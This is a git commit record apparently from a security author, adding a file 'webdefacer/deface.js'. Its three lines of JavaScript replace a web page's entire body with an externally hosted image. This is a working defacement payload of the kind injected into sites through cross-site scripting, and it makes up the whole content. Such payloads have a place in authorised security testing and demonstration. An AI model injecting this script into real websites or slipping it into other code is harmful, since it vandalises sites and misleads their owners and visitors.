c85db470348b9178ef201e2347ec73b5a78c2c88
Axcel Security <g4xyk00@gmail.com>
2018-02-12 17:54:37 +0800

    Initial commit

---
+++ webdefacer/deface.js
@@ -0,0 +1,3 @@
+(function() {
+	document.getElementsByTagName('body')[0].innerHTML = "<img src=\"https://www.nhn.no/media/1348/informasjonssikkerhet_shutterstock_120012388.jpg\" width=\"100%\"/>";
+})();
